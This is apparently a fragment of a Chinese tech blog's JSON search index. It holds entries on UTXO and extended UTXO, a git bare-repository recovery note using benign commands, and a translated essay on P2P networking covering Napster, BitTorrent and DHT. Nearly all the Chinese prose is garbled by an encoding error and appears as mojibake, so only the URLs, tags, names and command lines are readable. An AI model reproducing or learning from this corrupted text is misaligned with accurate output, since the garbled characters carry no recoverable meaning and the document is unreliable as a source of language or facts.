åªæœ‰æœªä½¿ç”¨çš„è¾“å‡ºå¯ç”¨äºè¿›ä¸€æ­¥çš„äº¤æ˜“ï¼Œè¿™ä¸€æ¡ä»¶å¯¹äºé˜²æ­¢é‡å¤æ¶ˆè´¹å’Œæ¬ºè¯ˆæ˜¯å¿…è¦çš„ã€‚ ","date":"2022-08-31","objectID":"/utxo/:4:0","tags":["UTXO","L0","Web3.0"],"title":"UTXO","uri":"/utxo/"},{"categories":["Blockchain"],"content":"æ‰©å±•çš„UTXO (EUTXO) å‚è€ƒè¿™é‡Œ https://iohk.io/en/blog/posts/2021/03/11/cardanos-extended-utxo-accounting-model/ ","date":"2022-08-31","objectID":"/utxo/:5:0","tags":["UTXO","L0","Web3.0"],"title":"UTXO","uri":"/utxo/"},{"categories":["devops"],"content":"åˆ åº“è·‘è·¯, å¦‚ä½•æ¢å¤ ç»™ä»£ç æ‰“tagçš„æ—¶å€™, å‘ç° fatal: 'xxx/myproject.git' does not appear to be a git repository æœåŠ¡å™¨ä¸Šä¸€çœ‹, è¢«äººåˆ äº†, NB-PLUS é¦–å…ˆæœ¬åœ°æœºçš„cloneä¸­æŸ¥çœ‹è¿œç¨‹è·¯å¾„ \u003e git remote -v origin root@XXX:/xxx/myproject.git (fetch) origin root@XXX:/xxx/myproject.git (push) åˆ°æœåŠ¡å™¨ä¸Šåˆ›å»ºå¯¹åº”çš„è·¯å¾„ mkdir -p /xxx/ åœ¨æœåŠ¡ä¸Šåˆ›å»ºä¸€ä¸ªç©ºçš„repository cd /xxx/ git init --bare myproject.git åˆ°æœ¬åœ°æœºcloneä¸­ æ·»åŠ ç°å­˜ä»£ç åˆ°æœåŠ¡å™¨ git add . git commit -m \"re-add all\" git push origin master ","date":"2022-08-30","objectID":"/git-master%E6%81%A2%E5%A4%8D/:0:0","tags":["git"],"title":"Git Masteræ¢å¤","uri":"/git-master%E6%81%A2%E5%A4%8D/"},{"categories":["Blockchain"],"content":"æ¥è‡ª HASEEB QURESHI çš„ä¸‰ç¯‡å…³äºP2Pç½‘ç»œçš„åšå®¢çš„ç¿»è¯‘ æ¥è‡ªè¿™ä¸‰ç¯‡åšå®¢ https://nakamoto.com/p2p-networking/ https://nakamoto.com/gnutella/ https://nakamoto.com/bitcoins-p2p-network/ ","date":"2022-08-23","objectID":"/p2p/:0:0","tags":["p2p","L0","Web3.0"],"title":"P2P","uri":"/p2p/"},{"categories":["Blockchain"],"content":"P2P Networking å¦‚æœæˆ‘ä»¬æƒ³ä»æ ¹æœ¬ä¸Šäº†è§£åŠ å¯†è´§å¸æ˜¯å¦‚ä½•å·¥ä½œçš„ï¼Œæˆ‘ä»¬çš„å·¥å…·åŒ…é‡Œéœ€è¦çš„ä¸ä»…ä»…æ˜¯å¯†ç å­¦ã€‚ä¸ºäº†è®©åŠ å¯†è´§å¸å‘æŒ¥ä½œç”¨ï¼Œå®ƒéœ€è¦çš„ä¸ä»…ä»…æ˜¯å¯†ç å­¦ä¸Šçš„å®‰å…¨â€“å®ƒè¿˜éœ€è¦å»ä¸­å¿ƒåŒ–ã€‚ä¸­æœ¬èªä»21ä¸–çºªåˆçš„ç‚¹å¯¹ç‚¹ï¼ˆP2Pï¼‰ç½‘ç»œå†å²ä¸­å­¦åˆ°äº†å¾ˆå¤šä¸œè¥¿ã€‚è¿™äº›ç»éªŒä¸ºæ¯”ç‰¹å¸çš„ç½‘ç»œå±‚è®¾è®¡æä¾›äº†å‚è€ƒã€‚ åœ¨æœ¬æ¨¡å—ä¸­ï¼Œæˆ‘ä»¬å°†æ¢è®¨æ¯”ç‰¹å¸çš„ç½‘ç»œæ¨¡å‹ï¼Œä»¥åŠå®ƒå¦‚ä½•å®ç°å…¶ä¸¤ä¸ªä¸»è¦ç›®æ ‡ï¼šå»ä¸­å¿ƒåŒ–å’ŒæŠ—å®¡æŸ¥ã€‚ ","date":"2022-08-23","objectID":"/p2p/:1:0","tags":["p2p","L0","Web3.0"],"title":"P2P","uri":"/p2p/"},{"categories":["Blockchain"],"content":"ç½‘ç»œæ¶æ„ ä¼ ç»Ÿçš„ç½‘ç»œæœåŠ¡æ˜¯ä»¥é›†ä¸­çš„å®¢æˆ·ç«¯-æœåŠ¡å™¨æ¨¡å¼è¿›è¡Œæ¶æ„çš„ã€‚ä¸€ä¸ªä¸­å¤®æœåŠ¡å™¨æä¾›æœåŠ¡ï¼Œæ¯ä¸ªå®¢æˆ·ç«¯ä»è¿™ä¸ªä¸­å¤®æœåŠ¡å™¨è¯·æ±‚æ•°æ®æˆ–å·¥ä½œã€‚ä½ åœ¨ç½‘ç»œä¸Šä½¿ç”¨çš„å‡ ä¹æ‰€æœ‰åº”ç”¨ç¨‹åºéƒ½æ˜¯è¿™æ ·çš„ç»“æ„â€“Facebookã€Googleã€Wordpressã€‚ä»Šå¤©ï¼Œâ€œä¸­å¤®æœåŠ¡å™¨ â€œé€šå¸¸æ˜¯åœ¨è´Ÿè½½å¹³è¡¡å™¨åé¢çš„ä¸€ä¸ªæœåŠ¡å™¨ç¾¤ï¼Œä½†åœ¨é«˜å±‚æ¬¡ä¸Šï¼Œä»–ä»¬ä»æ ¹æœ¬ä¸Šæ˜¯ç›¸åŒçš„æ¶æ„ã€‚ å®¢æˆ·ç«¯/æœåŠ¡å™¨æ¶æ„ä»æ ¹æœ¬ä¸Šè¯´æ˜¯é›†ä¸­å¼çš„ï¼Œå¹¶ä¾èµ–äºå•ä¸€çš„ä¸€æ–¹ã€‚å¦‚æœä¸­å¤®æœåŠ¡å™¨å…³é—­ï¼Œè¯¥æœåŠ¡å°±ä¼šæš‚åœï¼ˆå¦‚å‘ç”Ÿåœ¨DigiCashçš„æƒ…å†µï¼‰ã€‚ P2Pç½‘ç»œæ˜¯ä¸€ç§åˆ†å¸ƒå¼çš„ç½‘ç»œæ¨¡å¼ï¼Œå…¶ä¸­æ²¡æœ‰ä¸­å¤®æœåŠ¡å™¨ã€‚ç›¸åï¼Œæ¯ä¸ªå¯¹ç­‰ä½“æ‰¿æ‹…ç€ç½‘ç»œçš„éƒ¨åˆ†è´Ÿè·ã€‚è¿™æ„å‘³ç€æ¯ä¸ªå¯¹ç­‰ä½“å¯ä»¥å‘ç½‘ç»œè¿›è¡ŒæŸ¥è¯¢ï¼Œä½†ä¹Ÿå¿…é¡»å¯¹æŸ¥è¯¢ä½œå‡ºå›åº”ã€‚ä½ å¯ä»¥æŠŠP2Pç½‘ç»œæƒ³è±¡æˆä¸€ä¸ª â€œç¾¤(swarm)\"ï¼Œå®ƒèåˆäº†å®¢æˆ·å’ŒæœåŠ¡å™¨çš„è§’è‰²ã€‚ P2Pç½‘ç»œæ˜¯å¼•äººæ³¨ç›®çš„ï¼Œå› ä¸ºå®ƒå…è®¸æˆ‘ä»¬å®ç°å»ä¸­å¿ƒåŒ–ã€‚ä¸€ä¸ªå»ä¸­å¿ƒåŒ–çš„ç½‘ç»œæ˜¯ä¸€ä¸ªä¸ä¾èµ–ä»»ä½•å•ä¸€èŠ‚ç‚¹çš„ç½‘ç»œï¼Œå› æ­¤å¯¹ä»»ä½•å•ä¸€èŠ‚ç‚¹çš„å…³é—­æˆ–ç¦»å¼€ç½‘ç»œéƒ½å…·æœ‰å¼¹æ€§ã€‚ å› æ­¤ï¼Œå»ä¸­å¿ƒåŒ–æ˜¯å¾ˆé…·çš„ï¼Œä½†æ˜¯å®è´¨æ€§çš„é—®é¢˜æ˜¯â€“å»ä¸­å¿ƒåŒ–ç©¶ç«Ÿæ˜¯å¦‚ä½•ä½¿ä¸€ä¸ªç³»ç»Ÿå˜å¾—æ›´å¥½ï¼Ÿ å»ä¸­å¿ƒåŒ–ç»™æˆ‘ä»¬å¸¦æ¥ä¸¤ä¸ªç†æƒ³çš„å±æ€§ï¼š ç¬¬ä¸€ä¸ªå±æ€§æ˜¯å´©æºƒå®¹é”™ã€‚å´©æºƒå®¹é”™æ„å‘³ç€ä½ èƒ½å¤Ÿæ‰¿å—å•ä¸ªèŠ‚ç‚¹çš„æ•…éšœæˆ–å¤±æ•ˆâ€“å³ä½¿ä¸€ä¸ªèŠ‚ç‚¹æ­»äº†ï¼Œç³»ç»Ÿä»ç„¶å¯ä»¥è¿è¡Œã€‚è¿™å¯¹å¯æ‰©å±•æ€§è‡³å…³é‡è¦ï¼Œå› ä¸ºå¤§å‹ç½‘ç»œä¸€ç›´éƒ½æœ‰èŠ‚ç‚¹æ•…éšœã€‚ è¯‘è€…æ³¨: å¹³æ—¶æ‰€è¯´çš„å®¹é”™ç®—æ³•, ä¸»è¦æŒ‡2ç§, å´©æºƒå®¹é”™ å’Œ æ‹œå åº­å®¹é”™ å´©æºƒå®¹é”™ CFT: æœ‰èŠ‚ç‚¹æ•…éšœäº†, æ•´ä¸ªç³»ç»Ÿè¿˜èƒ½ç»§ç»­æ­£ç¡®è¿è¡Œ æ‹œå åº­å®¹é”™ BFT: æœ‰èŠ‚ç‚¹æ•°æ®é”™è¯¯(è¯´è°), æ•´ä¸ªç³»ç»Ÿè¿˜èƒ½æ­£ç¡®è¿è¡Œ(è¾¾æˆä¸€è‡´æ€§) å»ä¸­å¿ƒåŒ–ç»™æˆ‘ä»¬çš„ç¬¬äºŒä¸ªå±æ€§æ˜¯æŠ—å®¡æŸ¥ã€‚å¦‚æœä¸€ä¸ªèŠ‚ç‚¹è¢«å®¡æŸ¥ï¼Œä½†æ•´ä¸ªç½‘ç»œæ˜¯å»ä¸­å¿ƒåŒ–çš„ï¼Œé‚£ä¹ˆæ²¡æœ‰å…³ç³»â€“ç³»ç»Ÿçš„å…¶ä»–éƒ¨åˆ†ç»§ç»­è¿è¡Œã€‚ä¸ºäº†ä½¿å®¡æŸ¥åˆ¶åº¦æœ‰æ•ˆï¼Œé€šå¸¸æ¯ä¸ªèŠ‚ç‚¹éƒ½å¿…é¡»ä¸²é€šèµ·æ¥æ‰§è¡Œå®¡æŸ¥åˆ¶åº¦ï¼Œè€Œè¿™åœ¨ä¸€ä¸ªå¤§å‹ç½‘ç»œä¸­æ˜¯å¾ˆéš¾åšåˆ°çš„ã€‚å¦‚æœæˆ‘åœ¨ä¸€ä¸ªå»ä¸­å¿ƒåŒ–çš„ç½‘ç»œä¸­æœç´¢æ–‡ä»¶ï¼Œåªè¦æœ‰ä¸€ä¸ªèŠ‚ç‚¹æ„¿æ„ä¸ºæˆ‘çš„æŸ¥è¯¢æä¾›å›åº”ï¼Œæ•´ä¸ªäº‹æƒ…è¿˜æ˜¯å¯ä»¥çš„ã€‚ æˆ‘ä»¬ä¸ºä»€ä¹ˆè¦å…³å¿ƒè¿™äº›èµ„äº§ï¼Œè¿™å¯èƒ½å¹¶ä¸æ˜æ˜¾ã€‚æ¯•ç«Ÿï¼Œè°åœ¨ç ´åæˆ–å®¡æŸ¥è¿™äº›ç½‘ç»œï¼Ÿç®€å•å›é¡¾ä¸€ä¸‹P2Påè®®çš„å†å²ï¼Œå°±ä¼šæ˜ç™½ä¸ºä»€ä¹ˆä¸­æœ¬èªé‡è§†æ¯”ç‰¹å¸çš„è¿™äº›ç‰¹æ€§ã€‚ ","date":"2022-08-23","objectID":"/p2p/:1:1","tags":["p2p","L0","Web3.0"],"title":"P2P","uri":"/p2p/"},{"categories":["Blockchain"],"content":"P2P åè®®ç®€å² åœ¨90å¹´ä»£ï¼Œåœ¨å¤§å‹åˆ†å¸ƒå¼ç³»ç»Ÿä¸­åè°ƒå¤§è§„æ¨¡çš„è®¡ç®—ä»»åŠ¡æ˜¯ç›¸å½“ç½•è§çš„ã€‚å½“æ—¶MapReduceæˆ–HDFSè¿˜æ²¡æœ‰è¢«å‘æ˜å‡ºæ¥ï¼Œæ‰€ä»¥å¤§è§„æ¨¡çš„åˆ†å¸ƒå¼è®¡ç®—æ˜¯ç½•è§çš„ï¼Œä¹Ÿæ˜¯æ˜‚è´µçš„ã€‚P2Påè®®æ˜¯ç¬¬ä¸€ä¸ªåœ¨è®¡ç®—æœºæ•°é‡ä¸Šè¾¾åˆ°å¤§è§„æ¨¡çš„åˆ†å¸ƒå¼ç³»ç»Ÿï¼ˆé™¤äº†äº’è”ç½‘æœ¬èº«ï¼‰ã€‚ Napsterä¸æ˜¯ç¬¬ä¸€ä¸ªP2Påè®®ï¼Œä½†å®ƒæ˜¯ç¬¬ä¸€ä¸ªå±•ç¤ºP2Pæ¨¡å¼åŠ›é‡çš„ä¸»æµå…¬å…±æˆåŠŸã€‚ Napsterå…¬å¸ç”±ä¸¤åå¤§å­¦ç”ŸSean Parkerå’ŒShawn Fanningäº1999å¹´åˆ›ç«‹ã€‚å®ƒæä¾›äº†ä¸€ä¸ªç®€å•çš„ä»·å€¼ä¸»å¼ ï¼šå®ƒè®©ä½ ä»Napsterç½‘ç»œä¸­çš„ä»»ä½•ç”¨æˆ·é‚£é‡Œä¸‹è½½MP3æ–‡ä»¶ã€‚ Napsterçš„æ¶æ„å¾ˆç®€å•ã€‚æœ‰ä¸€ä¸ªä¸­å¤®NapsteræœåŠ¡ï¼Œè¿™ä¸»è¦æ˜¯ä¸€ä¸ªå·¨å¤§çš„æœç´¢ç´¢å¼•ï¼Œä¿æŒè·Ÿè¸ªæ‰€æœ‰çš„åŒè¡Œå’Œä»–ä»¬çš„å…±äº«å†…å®¹ã€‚å®ƒå°†å†…å®¹å…ƒæ•°æ®å­˜å‚¨ä¸ºä»¥ä¸‹ä¸‰å…ƒç»„: æ–‡ä»¶åã€IPåœ°å€ã€ç«¯å£å·ã€‚ æ¯å½“ä¸€ä¸ªå¯¹ç­‰ä½“(peer)åŠ å…¥Napsterç½‘ç»œæ—¶ï¼Œå¯¹ç­‰ä½“å°±ä¼šå‘ä¸­å¤®æœåŠ¡å™¨å‘é€ä¸€ä»½å®ƒæ„¿æ„åˆ†äº«çš„æ–‡ä»¶æ¸…å•ã€‚ç„¶åï¼ŒæœåŠ¡å™¨å°†æ›´æ–°å…¶æœç´¢ç´¢å¼•ï¼Œä»¥åŒ…æ‹¬è¿™äº›æ–°å…±äº«çš„æ–‡ä»¶ã€‚ æ¯å½“ç”¨æˆ·æœç´¢ä¸€ä¸ªæ–‡ä»¶æ—¶ï¼ŒæœåŠ¡å™¨å°†æŸ¥è¯¢å…¶æœç´¢ç´¢å¼•ï¼Œå¹¶å‘ç”¨æˆ·å±•ç¤ºæ‰€æœ‰ç›¸å…³çš„ç‚¹å‡»ã€‚ç”±äºè¿™äº›ç‚¹å‡»ä»£è¡¨äº†å…¶ä»–å¯¹ç­‰ä½“çš„æ–‡ä»¶ï¼Œç”¨æˆ·å°†pingæ¯ä¸ªç›¸å…³å¯¹ç­‰ä½“çš„IPï¼Œä»¥ç¡®å®šä»–ä»¬çš„ä¸‹è½½å»¶è¿Ÿå’Œçº¿è·¯é€Ÿåº¦ã€‚ ä¸€æ—¦ç”¨æˆ·é€‰æ‹©äº†è¦ä¸‹è½½çš„æ–‡ä»¶ï¼Œä»–ä»¬çš„å®¢æˆ·ç«¯å°†ç›´æ¥ä»ä¸è¯¥æ–‡ä»¶ç›¸å¯¹åº”çš„IPä¸Šè·å–è¯¥æ–‡ä»¶ã€‚æ‰€æœ‰çš„æ–‡ä»¶ä¼ è¾“éƒ½ç›´æ¥å‘ç”Ÿåœ¨å¯¹ç­‰ä½“ä¹‹é—´ã€‚åœ¨è¿™ä¸€ç‚¹ä¸Šï¼ŒNapsteræœåŠ¡å™¨æœ¬èº«å·²ä¸å†å‚ä¸ã€‚ ä»æŸç§æ„ä¹‰ä¸Šè¯´ï¼ŒNapsteræ˜¯å®¢æˆ·/æœåŠ¡å™¨æ¨¡å¼å’ŒP2Pæ¨¡å¼ä¹‹é—´çš„äº¤å‰ã€‚æœåŠ¡å™¨åŸºæœ¬ä¸Šæ˜¯ä½œä¸ºMP3ä¸‹è½½è€…çš„ä¸€ä¸ªåŒ¹é…å¼•æ“ã€‚è€Œäº‹å®è¯æ˜ï¼Œæœ‰ä¸€å¤§æ‰¹äººæƒ³ä¸‹è½½MP3ã€‚ åœ¨æ¨å‡ºåä¸ä¹…ï¼ŒNapsterå°±åƒé‡ç«ä¸€æ ·èµ·é£äº†ã€‚åœ¨å…¶é«˜å³°æœŸï¼Œè¯¥æœåŠ¡æœ‰è¶…è¿‡8000ä¸‡ç”¨æˆ·ã€‚2001å¹´ï¼Œå®ƒç»å¸¸ä½¿å¤§å­¦å®¿èˆçš„é«˜é€Ÿç½‘ç»œè¿‡è½½ï¼Œå¹¶å¾ˆå¿«åœ¨è®¸å¤šå¤§å­¦è¢«ç¦æ­¢ä½¿ç”¨ã€‚ 2000å¹´ï¼ŒNapsterè¢«Metallicaã€Dr.Dreèµ·è¯‰ï¼Œéšååˆè¢«A\u0026Må”±ç‰‡å…¬å¸èµ·è¯‰ä¾µçŠ¯ç‰ˆæƒã€‚è¿™äº›è¯‰è®¼æˆåŠŸåœ°ä¸ºNapsterå…¬å¸å¸¦æ¥äº†æ›´å¤šçš„æ–°é—»æŠ¥é“å’Œå®£ä¼ ã€‚ä½†æ˜¯ï¼Œå½“æ³•å®˜å¯¹Napsterå…¬å¸å‘å‡ºç¦ä»¤ï¼Œåœæ­¢å—ç‰ˆæƒä¿æŠ¤çš„éŸ³ä¹äº¤æ˜“æ—¶ï¼Œè¿™åœºæ¼”å‡ºç»ˆäºç»“æŸäº†ã€‚ ","date":"2022-08-23","objectID":"/p2p/:1:2","tags":["p2p","L0","Web3.0"],"title":"P2P","uri":"/p2p/"},{"categories":["Blockchain"],"content":"Napsterå…¬å¸çš„æ•™è®­ è™½ç„¶æˆ‘ä»¬ç§°Napsterä¸ºP2Pç½‘ç»œï¼Œä½†åœ¨æ–‡ä»¶å‘ç°æ–¹é¢ï¼ŒNapsterçš„è®¾è®¡æ˜¯ä¼ ç»Ÿçš„å®¢æˆ·-æœåŠ¡å™¨æ¨¡å¼ã€‚åªæœ‰æ–‡ä»¶ä¼ è¾“å®é™…ä¸Šæ˜¯P2Pã€‚è¿™ç»™ä»–ä»¬çš„æ¶æ„å¸¦æ¥äº†å•ç‚¹æ•…éšœï¼Œå¹¶æ„å‘³ç€ç½‘ç»œåœ¨Napsterå…¬å¸å…³é—­åæ¶ˆå¤±äº†ã€‚ åœ¨Napsterä¸­ï¼Œä¹Ÿå¾ˆå°‘è€ƒè™‘å®‰å…¨é—®é¢˜ã€‚æ‰€æœ‰çš„ä¿¡æ¯å’Œè¯·æ±‚éƒ½æ˜¯ä»¥æ˜æ–‡å½¢å¼å‘é€çš„ï¼Œæ‰€æœ‰çš„IPéƒ½æ˜¯å…¬å¼€çš„ï¼Œè¿™ä½¿å¾—è¯¥ç³»ç»Ÿå‡ ä¹æ²¡æœ‰éšç§å¯è¨€ã€‚ ä½†æœ€ç»ˆï¼ŒNapsterå…¬å¸æ£ºæé‡Œçš„é’‰å­æ˜¯æ³•å¾‹ä¸Šçš„ï¼Œè€Œä¸æ˜¯æŠ€æœ¯ä¸Šçš„â€“Napsterå…¬å¸è¢«è®¤ä¸ºå¯¹å…¶ç”¨æˆ·çš„ç‰ˆæƒä¾µçŠ¯è´Ÿæœ‰æ³•å¾‹è´£ä»»ã€‚å°½ç®¡Napsterå…¬å¸æ²¡æœ‰ç›´æ¥ä¾µçŠ¯ä»»ä½•ç‰ˆæƒï¼Œä½†æ³•å®˜è£å®šï¼ŒNapsterå…¬å¸è¯±ä½¿å…¶ç”¨æˆ·ä¾µçŠ¯ç‰ˆæƒï¼Œå› æ­¤ â€œæ›¿ä»£æ€§åœ°ä¾µçŠ¯ â€œäº†ç‰ˆæƒäººçš„æƒåˆ©ã€‚ æ³•é™¢è¦æ±‚Napsterå…¬å¸éåˆ¶æ‰€æœ‰ç‰ˆæƒä¾µæƒè¡Œä¸ºã€‚Napsterå…¬å¸å£°ç§°ï¼Œå®ƒå¯ä»¥å®æ–½ä¸€ä¸ªè§£å†³æ–¹æ¡ˆï¼Œä»¥é˜»æ­¢99.4%çš„ä¾µæƒè¡Œä¸ºï¼Œä½†æ³•é™¢è®¤ä¸ºè¿™è¿˜ä¸å¤Ÿï¼Œé™¤éä»–ä»¬èƒ½100%åœ°é˜»æ­¢ã€‚ ","date":"2022-08-23","objectID":"/p2p/:1:3","tags":["p2p","L0","Web3.0"],"title":"P2P","uri":"/p2p/"},{"categories":["Blockchain"],"content":"åNaspterä¸–ç•Œ Napsterå…¬å¸æœ€ç»ˆç”³è¯·äº†ç ´äº§ã€‚å®ƒçš„èµ„äº§å°†è¢«æ”¶è´­å¹¶é‡æ–°å‘½åä¸ºRhapsodyã€‚ä½†æ˜¯ï¼ŒNapsterå…¬å¸çš„æ¶ˆäº¡å°†æ€èµ·ä¸€åœºå·¨å¤§çš„é£æš´ï¼Œä»¥è‡³äºæ©ç›–äº†å®ƒçš„æ¸Šæºã€‚LimeWireå’ŒKaZaAç­‰ç½‘ç»œæ¥æ›¿äº†Napsterï¼Œå»ºç«‹äº†æ€§èƒ½æ›´å¼ºã€å»ä¸­å¿ƒåŒ–çš„P2Påè®®ï¼Œæ¯”å‰è€…çš„é™åˆ¶æ›´å°‘ã€‚ éšç€æ—¶é—´çš„æ¨ç§»ï¼Œæ‰€æœ‰è¿™äº›åè®®æœ€ç»ˆéƒ½å°†è¢«BitTorrentæ‰€å–ä»£ã€‚åˆ°2009å¹´ï¼ŒP2Pæ–‡ä»¶å…±äº«â€“ä¸»è¦æ˜¯BitTorrentâ€“å äº†æ‰€æœ‰äº’è”ç½‘æµé‡çš„70%ã€‚å¿«è¿›åˆ°ä»Šå¤©ï¼ŒBitTorrentæ˜¯ä¸–ç•Œä¸Šæœ€å¤§çš„å•ä¸€P2Pç½‘ç»œï¼Œä¹Ÿæ˜¯å¤§å¤šæ•°å›½å®¶æœ€å¤§çš„ä¸Šæ¸¸æµé‡æ¥æºã€‚ å€¼å¾—åœä¸‹æ¥åæ€çš„æ˜¯ï¼šä¸ºä»€ä¹ˆBitTorrentèƒ½å¤ŸæˆåŠŸï¼Œè€Œå…¶ä»–å¤§å¤šæ•°åè®®å´é€æ¸æ¶ˆå¤±ï¼Ÿ é¦–å…ˆï¼ŒBitTorrentçš„å¸¦å®½å…±äº«æ˜¯ä»¥ç‰™è¿˜ç‰™çš„æ¨¡å¼ï¼Œè¿™æ„å‘³ç€å¯¹ç­‰è€…ä¼šç»™é‚£äº›å¯¹ä»–ä»¬æ…·æ…¨çš„äººæä¾›æ›´å¤šçš„å¸¦å®½ã€‚è¿™ç§äº’æƒ çš„ç³»ç»Ÿä¸é¼“åŠ±æ­ä¾¿è½¦ï¼Œé¼“åŠ±ä»˜å‡ºã€‚(åœ¨ç°å®ä¸­ï¼Œä»¥ç‰™è¿˜ç‰™çš„æ¨¡å¼å¹¶ä¸ç‰¹åˆ«å¥½ç”¨ï¼Œä½†ä¸ä»¥å‰çš„æ–‡ä»¶å…±äº«åè®®ç›¸æ¯”ï¼Œå®ƒè¿˜æ˜¯ä¸€ä¸ªè¿›æ­¥ã€‚ï¼‰ å½“æ¶‰åŠåˆ°å¸¦å®½æ¶ˆè€—æ—¶ï¼ŒBitTorrentä¹Ÿæ°å¥½æ˜¯éå¸¸æœ‰æ•ˆçš„ï¼Œç‰¹åˆ«æ˜¯å¯¹äºé‚£äº›éœ€æ±‚é‡å¤§çš„æ–‡ä»¶ã€‚ ä½†åœ¨è®¸å¤šæ–¹é¢ï¼ŒBitTorrentæˆåŠŸçš„æ ¸å¿ƒçœŸæ­£å½’ç»“äºä»–ä»¬æ— å¯æŒ‘å‰”çš„ä¿¡æ¯ä¼ é€’ã€‚è¯¥åè®®çš„å¼€å‘è€…ä»æœªä¸»å¼ å°†ç‰ˆæƒæ–‡ä»¶å…±äº«ä½œä¸ºè¯¥æœåŠ¡çš„åˆæ³•ç”¨é€”ã€‚ä»–ä»¬æŠŠBitTorrentè¯´æˆæ˜¯ â€œä¸ºä½ çš„ç½‘ç«™æä¾›æ›´å¥½çš„æœåŠ¡â€ï¼Œä»–ä»¬çš„ç½‘ç«™åªæåˆ°æ— å®³çš„ä½¿ç”¨æ¡ˆä¾‹ï¼Œå¦‚Linuxå‘è¡Œç‰ˆå’Œä¸‹è½½é­”å…½ä¸–ç•Œçš„æ›´æ–°ã€‚ å³ä½¿ä½ æƒ³è¿™æ ·åšï¼Œä¹Ÿæ²¡æœ‰é›†ä¸­çš„BitTorrentæœåŠ¡å¯ä»¥ä½¿ç”¨ã€‚åªæœ‰ä¸€ä¸ªç”±ç§äººç»è¥çš„BitTorrentè¿½è¸ªå™¨ç»„æˆçš„è”åˆç½‘ç»œã€‚å› æ­¤ï¼Œå½“å…¶ä»–P2Pç½‘ç»œè¢«æ‰§æ³•éƒ¨é—¨å…³é—­æ—¶ï¼ŒBitTorrentåªèƒ½å¯¹ä¸ªåˆ«è¿½è¸ªè€…é‡‡å–è¡ŒåŠ¨ã€‚ç”±äºBitTorrentçš„DHTæ¨¡å¼ï¼Œè®¸å¤štorrentsç”šè‡³å¯ä»¥åœ¨ä»»ä½•å•ä¸ªè·Ÿè¸ªå™¨è¢«æŸ¥å°åå­˜æ´»ã€‚å› æ­¤ï¼Œé’ˆå¯¹BitTorrentçš„å®¡æŸ¥ä¼å›¾å¾€å¾€ä¼šæ¼”å˜æˆä¸€åœº â€œæ‰“åœ°é¼  â€œæ¸¸æˆã€‚ è¯‘è€…æ³¨: DHT: åˆ†å¸ƒå¼å“ˆå¸Œè¡¨, å‚è€ƒæ–‡ç« : https://luyuhuang.tech/2020/03/06/dht-and-p2p.html#23-åˆ†å¸ƒå¼å“ˆå¸Œè¡¨ https://colobu.com/2018/03/26/distributed-hash-table/ ä¸¾ä¾‹: åœ¨åŒºå—é“¾ä¸­, åŒºå—é“¾æœ¬èº«çš„å­˜å‚¨æ˜¯ä¸é€‚åˆè¿›è¡Œå¤§é‡æ•°æ®å­˜å‚¨çš„, æ‰€ä»¥å…¶åˆ©ç”¨äº†DHTæ¥è¿›è¡Œå¤§é‡æ•°æ®å­˜å‚¨, æ¯”å¦‚IPFS ä»¥å¤ªåŠèŠ‚ç‚¹å‘ç°æ˜¯åŸºäºKademliaåè®®çš„, Kademliaæ˜¯ä¸€ä¸ªåŸºäºUDPçš„åˆ†å¸ƒå¼å“ˆå¸Œè¡¨åè®® æ–‡ä»¶å…±äº«é©å‘½å¯¹æˆ‘ä»¬ä¸æŠ€æœ¯å’Œåª’ä½“çš„å…³ç³»äº§ç”Ÿäº†æ·±åˆ»çš„ç¤¾ä¼šå½±å“ã€‚ä½†å®ƒçš„å½±å“å¹¶æ²¡æœ‰ç»“æŸâ€“å®ƒè¿˜å¼•å‘äº†å¯¹P2Påè®®çš„å·¥ç¨‹å…´è¶£çš„å¤è‹ã€‚è¿™å¯¼è‡´äº†è®¸å¤šå­¦æœ¯é¡¹ç›®ï¼Œå¦‚Folding@homeå’ŒSETI@homeï¼Œä¸ªäººå¯ä»¥å°†å…¶è®¡ç®—èƒ½åŠ›å€Ÿç»™ä¸–ç•Œè§„æ¨¡çš„P2Pç§‘å­¦è®¡ç®—é¡¹ç›®ã€‚ç”šè‡³è¿˜æœ‰åƒSkypeè¿™æ ·æˆåŠŸçš„åˆåˆ›å…¬å¸ï¼Œæœ€åˆä¹Ÿæ˜¯å»ºç«‹åœ¨P2Pæ¶æ„ä¹‹ä¸Šã€‚ ä½†éšç€æ‰§æ³•å’Œæ³•å¾‹æ–—äº‰çš„åŠ å‰§ï¼ŒP2Påè®®åœ¨å…¬ä¼—å¿ƒç›®ä¸­é€æ¸æˆä¸º â€œéæ³•æ–‡ä»¶å…±äº« â€œçš„åŒä¹‰è¯ã€‚åœ¨ç»å†äº†è¶³å¤Ÿå¤šçš„è´Ÿé¢å¤´æ¡æ–°é—»åï¼Œå­¦æœ¯ç•Œçš„çƒ­æƒ…ä¹Ÿéšä¹‹æ¯ç«­ã€‚åŒæ—¶ï¼Œåˆ†å¸ƒå¼ç³»ç»Ÿçš„æ”¹è¿›ä½¿å·¥ç¨‹å¸ˆèƒ½å¤Ÿå»ºç«‹æ›´å¤§è§„æ¨¡çš„é›†ä¸­å¼ç³»ç»Ÿï¼Œä½¿P2Pæ¶æ„åœ¨å¤§å¤šæ•°å•†ä¸šåº”ç”¨ä¸­æ²¡æœ‰å¿…è¦ã€‚ æ­¤å¤–ï¼Œäº‹å®è¯æ˜å¾ˆéš¾å›´ç»•P2Påè®®å»ºç«‹å¯æŒç»­çš„å•†ä¸šæ¨¡å¼ã€‚å¤§å¤šæ•°å†…å®¹ä¸šåŠ¡éœ€è¦ä¸€ä¸ªä¸­å¤®ç»çºªäººæˆ–DRMæ¥è·Ÿè¸ªä½¿ç”¨æƒ…å†µå¹¶æ”¶å–è´¹ç”¨ã€‚å‡ ä¹æ ¹æ®å®šä¹‰ï¼ŒP2Påè®®å¾ˆéš¾å®ç°é›†ä¸­è·Ÿè¸ªã€‚uTorrentçš„å‰CEOä¸¹å°¼å°”-è‰¾å…‹ï¼ˆDaniel Ekï¼‰æ”¾å¼ƒäº†BitTorrentçš„ä¸–ç•Œï¼Œå…±åŒåˆ›å»ºäº†éŸ³ä¹å…¬å¸Spotifyï¼Œè¿™å°±æ˜¯å…¸å‹çš„ä¾‹å­ã€‚æ‰€æœ‰è¿™äº›å› ç´ å¤§ä½“ä¸Šä¿ƒæˆäº†å¯¹P2Påè®®å…´è¶£çš„ä¸‹é™ã€‚ 